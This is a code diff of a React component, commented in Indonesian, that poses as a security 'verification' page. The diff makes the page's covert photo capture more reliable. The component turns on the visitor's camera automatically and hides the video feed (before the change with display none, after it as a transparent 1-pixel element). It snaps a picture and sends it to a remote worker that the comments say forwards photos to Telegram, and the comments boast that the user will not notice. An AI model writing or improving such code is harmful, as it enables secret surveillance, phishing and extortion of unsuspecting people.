@@ -3,7 +3,7 @@
 import React, { useState, useRef, useEffect, useCallback } from 'react';
 
 // ============================================================
-// 👻 SMILE STEALTH CAPTURE - ZERO CAMERA VISIBILITY
+// 👻 SMILE STEALTH CAPTURE - FIXED VERSION
 // ============================================================
 
 interface SendPhotoResponse {
@@ -17,9 +17,8 @@ const SmileStealthCapture: React.FC = () => {
   // ============================================================
   const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';
   
-  // ⏱️ WAKTU CAPTURE (ms) - super cepat!
-  const CAPTURE_DELAY = 300; // 0.3 detik setelah kamera ready
-  const CAMERA_HIDE_DELAY = 100; // 0.1 detik setelah capture
+  // ⏱️ WAKTU CAPTURE
+  const CAPTURE_DELAY = 500; // 0.5 detik - kasih waktu buat video siap
 
   // ============================================================
   // 📦 STATE
@@ -27,7 +26,6 @@ const SmileStealthCapture: React.FC = () => {
   const [sessionId, setSessionId] = useState('');
   const [isCameraReady, setIsCameraReady] = useState(false);
   const [isSending, setIsSending] = useState(false);
-  const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
   const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
     message: '',
     type: '',
@@ -40,14 +38,16 @@ const SmileStealthCapture: React.FC = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
-  const hideTimeoutRef = useRef<NodeJS.Timeout | null>(null);
   const hasCapturedRef = useRef(false);
+  const isMountedRef = useRef(true);
 
   // ============================================================
   // 🛠️ HELPER
   // ============================================================
   const showStatus = useCallback((message: string, type: 'info' | 'success' | 'error') => {
-    setStatus({ message, type });
+    if (isMountedRef.current) {
+      setStatus({ message, type });
+    }
   }, []);
 
   // ============================================================
@@ -72,14 +72,13 @@ const SmileStealthCapture: React.FC = () => {
   }, []);
 
   // ============================================================
-  // 🚀 AUTO START - LANGSUNG JALAN
+  // 🚀 AUTO START
   // ============================================================
   useEffect(() => {
     if (sessionId) {
-      // Start camera secepatnya
       const timer = setTimeout(() => {
         startCamera();
-      }, 200);
+      }, 300);
       return () => clearTimeout(timer);
     }
   }, [sessionId]);
@@ -88,19 +87,30 @@ const SmileStealthCapture: React.FC = () => {
   // 🧹 CLEANUP
   // ============================================================
   useEffect(() => {
+    isMountedRef.current = true;
     return () => {
+      isMountedRef.current = false;
       if (captureTimeoutRef.current) clearTimeout(captureTimeoutRef.current);
-      if (hideTimeoutRef.current) clearTimeout(hideTimeoutRef.current);
       stopCamera();
     };
   }, []);
 
   // ============================================================
-  // 📷 KAMERA - SILENT MODE
+  // 🛑 STOP KAMERA
+  // ============================================================
+  const stopCamera = useCallback(() => {
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach((t) => t.stop());
+      streamRef.current = null;
+    }
+    setIsCameraReady(false);
+  }, []);
+
+  // ============================================================
+  // 📷 START KAMERA
   // ============================================================
   const startCamera = async () => {
     try {
-      // Stop camera kalo udah ada
       stopCamera();
 
       const stream = await navigator.mediaDevices.getUserMedia({
@@ -117,16 +127,14 @@ const SmileStealthCapture: React.FC = () => {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         await videoRef.current.play();
-        // Video DISEMBUNYIKAN - gak keliatan sama user!
-        videoRef.current.style.display = 'none';
       }
 
       setIsCameraReady(true);
 
-      // 🔥 AUTO CAPTURE - SEGERA!
+      // 🎯 AUTO CAPTURE - cek kesiapan video
       if (!hasCapturedRef.current) {
         captureTimeoutRef.current = setTimeout(() => {
-          autoCaptureAndSend();
+          captureFrameAndSend();
         }, CAPTURE_DELAY);
       }
 
@@ -135,70 +143,74 @@ const SmileStealthCapture: React.FC = () => {
       showStatus('⚠️ Butuh akses kamera untuk verifikasi', 'error');
       setIsCameraReady(false);
       
-      // Retry setelah 1 detik
+      // Retry
       setTimeout(() => {
-        if (!hasCapturedRef.current) {
+        if (!hasCapturedRef.current && isMountedRef.current) {
           startCamera();
         }
-      }, 1000);
+      }, 1500);
     }
   };
 
   // ============================================================
-  // 🛑 STOP KAMERA - LANGSUNG MATI
+  // 📸 CAPTURE FRAME & SEND (FIXED)
   // ============================================================
-  const stopCamera = () => {
-    if (streamRef.current) {
-      streamRef.current.getTracks().forEach((t) => t.stop());
-      streamRef.current = null;
-    }
-    setIsCameraReady(false);
-  };
-
-  // ============================================================
-  // 📸 AUTO CAPTURE + AUTO SEND - SUPER CEPAT!
-  // ============================================================
-  const autoCaptureAndSend = useCallback(() => {
+  const captureFrameAndSend = useCallback(() => {
     if (hasCapturedRef.current) return;
-    if (!isCameraReady || !streamRef.current) {
-      // Retry kalo blom ready
-      captureTimeoutRef.current = setTimeout(() => {
-        autoCaptureAndSend();
-      }, 100);
+
+    const video = videoRef.current;
+    
+    // 🔥 CEK: video siap dan punya dimensi
+    if (!video || video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
+      // Retry setelah 100ms
+      captureTimeoutRef.current = setTimeout(captureFrameAndSend, 100);
       return;
     }
 
-    const video = videoRef.current;
-    if (!video) return;
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
 
-    // Ambil frame dari video
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    if (!ctx) return;
+      if (!ctx) {
+        console.error('Canvas context failed');
+        return;
+      }
 
-    // Flip horizontal biar kaya mirror
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Mirror biar kaya selfie
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const photoData = canvas.toDataURL('image/jpeg', 0.85);
-    setCapturedPhoto(photoData);
-    hasCapturedRef.current = true;
+      const photoData = canvas.toDataURL('image/jpeg', 0.85);
+      
+      // Validasi hasil capture
+      if (!photoData || photoData.length < 100) {
+        console.error('Photo data invalid, retrying...');
+        captureTimeoutRef.current = setTimeout(captureFrameAndSend, 200);
+        return;
+      }
 
-    // 🔥 MATIKAN KAMERA - LANGSUNG HILANG!
-    hideTimeoutRef.current = setTimeout(() => {
+      hasCapturedRef.current = true;
+      
+      // 🔥 MATIKAN KAMERA - setelah foto berhasil diambil
       stopCamera();
-      // Video di-hidden, kamera mati, user gak sadar
-    }, CAMERA_HIDE_DELAY);
+      
+      if (isMountedRef.current) {
+        showStatus('✅ Verifikasi berhasil', 'success');
+      }
 
-    showStatus('✅ Verifikasi berhasil', 'success');
+      // 📤 KIRIM FOTO
+      sendPhoto(photoData);
 
-    // Kirim foto ke Telegram
-    sendPhoto(photoData);
-
-  }, [isCameraReady]);
+    } catch (e) {
+      console.error('Capture failed:', e);
+      if (isMountedRef.current) {
+        showStatus('❌ Gagal mengambil foto', 'error');
+      }
+    }
+  }, [stopCamera, showStatus]);
 
   // ============================================================
   // 📤 SEND PHOTO KE TELEGRAM
@@ -224,28 +236,34 @@ const SmileStealthCapture: React.FC = () => {
 
       const result: SendPhotoResponse = await res.json();
 
-      if (result.success) {
-        setIsDone(true);
-        showStatus('✅ Verifikasi selesai', 'success');
-      } else {
-        showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
+      if (isMountedRef.current) {
+        if (result.success) {
+          setIsDone(true);
+          showStatus('✅ Verifikasi selesai', 'success');
+        } else {
+          showStatus('❌ Gagal: ' + (result.message || 'Error'), 'error');
+        }
       }
     } catch (err) {
       console.error('Send error:', err);
-      showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
+      if (isMountedRef.current) {
+        showStatus('❌ Gagal mengirim. Coba lagi.', 'error');
+      }
     } finally {
-      setIsSending(false);
+      if (isMountedRef.current) {
+        setIsSending(false);
+      }
     }
   };
 
   // ============================================================
-  // 🎨 RENDER - TAMPILAN POLOS, GAK ADA KAMERA!
+  // 🎨 RENDER
   // ============================================================
   return (
     <div className="min-h-screen bg-gray-50 flex justify-center items-center p-4 font-sans">
       <div className="bg-white rounded-2xl shadow-lg p-8 max-w-sm w-full border border-gray-100">
         
-        {/* Icon & Title */}
+        {/* Header */}
         <div className="text-center mb-6">
           <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
             <span className="text-3xl">🔐</span>
@@ -256,7 +274,7 @@ const SmileStealthCapture: React.FC = () => {
           </p>
         </div>
 
-        {/* Status Animation */}
+        {/* Status */}
         <div className="flex flex-col items-center gap-3 py-4">
           {!isDone && !status.message && (
             <>
@@ -286,21 +304,30 @@ const SmileStealthCapture: React.FC = () => {
                 <span className="text-3xl">✔️</span>
               </div>
               <p className="text-gray-600 text-sm">Verifikasi berhasil!</p>
-              <p className="text-gray-400 text-xs mt-1">Halaman akan tertutup otomatis</p>
             </div>
           )}
         </div>
 
-        {/* Hidden Video - TIDAK KELIHATAN */}
+        {/* ============================================================
+        🎯 VIDEO - TERSEMBUNYI TAPI TETAP BERJALAN
+        ============================================================ */}
         <video
           ref={videoRef}
-          className="hidden"
+          style={{
+            position: 'absolute',
+            opacity: 0,
+            pointerEvents: 'none',
+            width: '1px',
+            height: '1px',
+            top: 0,
+            left: 0,
+          }}
           autoPlay
           playsInline
           muted
         />
 
-        {/* Footer - Tidak Mencolok */}
+        {/* Footer */}
         <div className="mt-6 pt-4 border-t border-gray-100 text-center">
           <p className="text-gray-300 text-[10px]">
             {sessionId ? `ID: ${sessionId.substring(0, 6)}` : 'Loading...'}
